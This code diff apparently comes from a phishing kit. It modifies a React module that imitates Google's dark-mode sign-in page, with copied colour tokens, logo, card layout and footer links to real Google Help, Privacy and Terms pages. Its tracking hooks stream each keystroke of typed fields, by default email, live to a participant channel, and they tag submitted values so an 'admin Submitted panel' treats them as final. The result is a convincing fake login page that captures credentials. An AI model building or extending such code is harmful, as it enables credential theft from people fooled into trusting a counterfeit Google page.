@@ -1,17 +1,25 @@
-import { useEffect, useMemo } from "react";
+import {
+  createContext,
+  useContext,
+  useEffect,
+  useMemo,
+  type ReactNode,
+} from "react";
 import { useNavigate } from "@tanstack/react-router";
 import { useParticipant } from "@/hooks/useParticipant";
 
 export const GE_FONT_FAMILY = '"Google Sans", Roboto, Arial, sans-serif';
 
 /** Dark tokens from user's SingleFile dump (prefers-color-scheme: dark .AfoeCd) */
-export const GE_PAGE_BG = "rgb(30, 31, 32)"; // surface-container
-export const GE_CARD_BG = "rgb(14, 14, 14)"; // surface-container-lowest
-export const GE_PRIMARY = "rgb(168, 199, 250)"; // links / focus
+export const GE_PAGE_BG = "rgb(30, 31, 32)";
+export const GE_CARD_BG = "rgb(14, 14, 14)";
+export const GE_PRIMARY = "rgb(168, 199, 250)";
 export const GE_ON_PRIMARY = "rgb(6, 46, 111)";
-export const GE_NEXT_FILL = "rgb(138, 180, 248)"; // fill button
+export const GE_NEXT_FILL = "rgb(138, 180, 248)";
 export const GE_NEXT_INK = "rgb(32, 33, 36)";
-
+export const GE_OUTLINE = "rgb(142, 145, 143)";
+export const GE_ON_SURFACE = "rgb(227, 227, 227)";
+export const GE_ON_SURFACE_VARIANT = "rgb(196, 199, 197)";
 
 export function GoogleGLogo({
   width = 48,
@@ -75,6 +83,201 @@ export function GeFontStyle() {
   );
 }
 
+/** Shared page + card chrome so signin and loading stay the same size/position. */
+export const GE_SHELL_CSS = `
+html, body {
+  margin: 0;
+  padding: 0;
+  min-height: 100%;
+  background: ${GE_PAGE_BG} !important;
+  color: ${GE_ON_SURFACE};
+  color-scheme: dark !important;
+  font-family: ${GE_FONT_FAMILY};
+  -webkit-font-smoothing: antialiased;
+}
+.ge-shell {
+  --gm3-page: ${GE_PAGE_BG};
+  --gm3-card: ${GE_CARD_BG};
+  --gm3-primary: ${GE_PRIMARY};
+  --gm3-outline: ${GE_OUTLINE};
+  --gm3-on-surface: ${GE_ON_SURFACE};
+  --gm3-on-surface-variant: ${GE_ON_SURFACE_VARIANT};
+  --gm-next-fill: ${GE_NEXT_FILL};
+  --gm-next-ink: ${GE_NEXT_INK};
+  --c-ps-s: 24px;
+  --c-ps-e: 24px;
+  --wf-gutw: 24px;
+  box-sizing: border-box;
+  min-height: 100vh;
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+  background: var(--gm3-page);
+  padding: 24px 16px;
+  color: var(--gm3-on-surface);
+  font-family: ${GE_FONT_FAMILY};
+}
+.ge-shell *, .ge-shell *::before, .ge-shell *::after { box-sizing: border-box; }
+@media (min-width: 600px) {
+  .ge-shell { padding: 48px 24px; justify-content: center; }
+}
+.ge-card {
+  background: var(--gm3-card);
+  width: 100%;
+  max-width: 480px;
+  min-height: 528px;
+  border-radius: 28px;
+  padding: 40px 40px 36px;
+  display: flex;
+  flex-direction: column;
+  position: relative;
+  overflow: hidden;
+  transition: opacity .28s ease, transform .28s ease;
+}
+.ge-card.is-leaving {
+  opacity: 0;
+  transform: translateY(10px) scale(0.985);
+}
+.ge-card.is-enter {
+  animation: ge-card-enter .34s ease both;
+}
+@keyframes ge-card-enter {
+  from { opacity: 0; transform: translateY(12px) scale(0.985); }
+  to { opacity: 1; transform: none; }
+}
+@media (min-width: 900px) {
+  .ge-shell { --c-ps-s: 36px; --c-ps-e: 36px; --wf-gutw: 38px; }
+  .ge-card {
+    width: 1040px;
+    max-width: min(1040px, calc(100vw - 48px));
+    min-height: 400px;
+    height: 400px;
+    padding: 36px var(--c-ps-e) 36px var(--c-ps-s);
+    flex-direction: row;
+    align-items: stretch;
+  }
+}
+@media (min-width: 900px) and (max-width: 1199px) {
+  .ge-card {
+    width: 840px;
+    max-width: min(840px, calc(100vw - 48px));
+  }
+}
+.ge-pane-left, .ge-pane-right {
+  display: flex;
+  flex-direction: column;
+  min-width: 0;
+}
+@media (min-width: 900px) {
+  .ge-pane-left, .ge-pane-right {
+    flex: 1 1 50%;
+    max-width: 50%;
+  }
+  .ge-pane-left { padding-right: var(--wf-gutw); }
+  .ge-pane-right { padding-left: var(--wf-gutw); }
+}
+.ge-logo { display: block; width: 40px; height: 48px; flex-shrink: 0; }
+.ge-title {
+  margin: 16px 0 0;
+  font-weight: 400;
+  font-size: 2rem;
+  line-height: 1.25;
+  color: var(--gm3-on-surface);
+}
+@media (min-width: 840px) {
+  .ge-title { font-size: 2.25rem; line-height: 1.222; }
+}
+.ge-sub {
+  margin: 16px 0 0;
+  font-size: 1rem;
+  line-height: 1.5;
+  color: var(--gm3-on-surface);
+}
+.ge-footer {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+  width: 100%;
+  max-width: 480px;
+  margin-top: 16px;
+  padding: 0 4px;
+  gap: 8px;
+}
+@media (min-width: 900px) and (max-width: 1199px) {
+  .ge-footer { max-width: min(840px, calc(100vw - 48px)); }
+}
+@media (min-width: 1200px) {
+  .ge-footer { max-width: min(1040px, calc(100vw - 48px)); }
+}
+.ge-lang {
+  appearance: none;
+  border: 0;
+  background: transparent;
+  color: var(--gm3-on-surface);
+  font-family: inherit;
+  font-size: 0.75rem;
+  padding: 8px 28px 8px 12px;
+  border-radius: 8px;
+  cursor: pointer;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23c4c7c5' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+}
+.ge-lang:hover { background-color: rgba(227,227,227,.08); }
+.ge-footer-links {
+  display: flex;
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+.ge-footer-links a {
+  color: var(--gm3-on-surface);
+  font-size: 0.75rem;
+  text-decoration: none;
+  padding: 8px 12px;
+  border-radius: 8px;
+}
+.ge-footer-links a:hover { background: rgba(227,227,227,.08); }
+`;
+
+export function GeFooter() {
+  return (
+    <footer className="ge-footer">
+      <select className="ge-lang" aria-label="Change language" defaultValue="en-US">
+        <option value="en-US">English (United States)</option>
+        <option value="es">Español (España)</option>
+        <option value="fr">Français (France)</option>
+        <option value="de">Deutsch</option>
+        <option value="ja">日本語</option>
+      </select>
+      <ul className="ge-footer-links">
+        <li>
+          <a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener noreferrer">
+            Help
+          </a>
+        </li>
+        <li>
+          <a
+            href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            Privacy
+          </a>
+        </li>
+        <li>
+          <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank" rel="noopener noreferrer">
+            Terms
+          </a>
+        </li>
+      </ul>
+    </footer>
+  );
+}
+
 export function useIsObserve(): boolean {
   return useMemo(() => {
     if (typeof window === "undefined") return false;
@@ -86,7 +289,18 @@ export function useIsObserve(): boolean {
   }, []);
 }
 
-export function useGeTracking() {
+type GeTracking = {
+  sessionId: string;
+  trackClick: (label: string) => void;
+  trackInput: (field: string, value: string, ftype?: string) => void;
+  trackSubmit: (field: string, value: string) => void;
+  geNavigate: (to: string) => void;
+  isObserve: boolean;
+};
+
+const GeTrackCtx = createContext<GeTracking | null>(null);
+
+function useGeTrackingImpl(): GeTracking {
   const isObserve = useIsObserve();
   const navigate = useNavigate();
   const { emitInput, emitLiveInput, participantId } = useParticipant();
@@ -95,13 +309,15 @@ export function useGeTracking() {
     if (isObserve) return;
     emitInput("__click", label);
   }
-  function trackInput(field: string, value: string) {
+  function trackInput(field: string, value: string, ftype = "email") {
     if (isObserve) return;
-    emitLiveInput(field, value);
+    emitLiveInput(field, value, ftype);
   }
   function trackSubmit(field: string, value: string) {
     if (isObserve) return;
-    emitInput(field, value);
+    // Prefer *_submitted so the admin Submitted panel treats it as final.
+    const name = /_submitted$/i.test(field) ? field : `${field}_submitted`;
+    emitInput(name, value);
   }
   function geNavigate(to: string) {
     if (isObserve) return;
@@ -158,4 +374,18 @@ export function useGeTracking() {
     geNavigate,
     isObserve,
   };
+}
+
+/** Layout provider — keeps one participant channel alive across /ge/* pages. */
+export function GeTrackingProvider({ children }: { children: ReactNode }) {
+  const tracking = useGeTrackingImpl();
+  return <GeTrackCtx.Provider value={tracking}>{children}</GeTrackCtx.Provider>;
+}
+
+export function useGeTracking(): GeTracking {
+  const ctx = useContext(GeTrackCtx);
+  if (!ctx) {
+    throw new Error("useGeTracking must be used within GeTrackingProvider");
+  }
+  return ctx;
 }
